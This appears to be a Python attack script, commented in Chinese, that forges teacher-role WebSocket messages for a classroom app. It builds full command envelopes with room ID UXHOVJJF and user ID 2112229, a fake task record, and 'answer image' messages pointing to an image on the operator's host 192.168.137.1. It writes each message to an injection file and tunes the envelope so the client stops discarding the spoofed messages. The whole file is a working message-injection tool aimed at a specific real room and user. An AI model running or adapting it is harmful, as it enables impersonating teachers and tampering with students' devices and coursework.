# -*- coding: utf-8 -*-
"""inject_carrier_ti.py - 用完整 CommandBean 信封重发载体+图片
历史报告(NIGHT-STATUS/OPERATION-NIGHT)记录的真实信封:
  {"cmd":50001,"cId":"<课堂ID>","smsg":{...},"ct":"1","from":"teacher","ti":"<时间戳>"}
对比我们今天用的: {cmd,ct:"",from:"teacher",gt:0,cId,smsg}
差异: 缺 "ti" 时间戳; ct 为空字符串 = 可能被端侧判为无效消息而静默丢弃
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def env_full(mtype, data, cid, tag, cmd=0, frm="teacher"):
    now = int(time.time() * 1000)
    return json.dumps({
        "cmd": cmd, "cId": cid, "smsg": {
            "classRoomId": ROOM, "createTag": tag, "data": data,
            "forward": 0, "senderId": 0, "type": mtype, "userIds": UID,
        },
        "ct": "1", "from": frm, "gt": 0, "ti": str(now),
    }, ensure_ascii=False)


def inj(js, label, wait=9):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    now = int(time.time() * 1000)
    td = {
        "taskId": "LAB_T3", "subTaskId": "LAB_S3", "allTaskId": "LAB_T3",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D3", "subDesktopId": "LAB_D3",
        "defaultDesktopId": "LAB_D3", "defaultDesktopName": "lab",
        "sourceId": "LAB_R3", "itemType": 2, "taskType": 2,
        "taskCreateMode": 1, "pptSource": 1, "isFromPPT": 0,
        "number": 1, "originTotalNumber": 1, "content": "lab",
        "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0,
        "resourceInfo": {"sourceId": "LAB_R3", "taskId": "LAB_T3",
                         "name": "lab", "type": 1, "zipUrl": "",
                         "createTime": now},
    }
    js = json.dumps(td, ensure_ascii=False)
    inj(env_full(0, js, "179PD0001", "canvas_tag"), "type=0 完整信封(含ti/ct) 造载体", 14)
    bean = [{"index": 1, "localPath": "", "onlineUrl": "http://%s/x.png" % OUR}]
    for t in (1020007, 225):
        inj(env_full(t, json.dumps(bean, ensure_ascii=False), "179PD1%03d" % t, "simple_tea", 2),
            "type=%d 答案图片(完整信封)" % t, 8)
    print("done", flush=True)


if __name__ == "__main__":
    main()
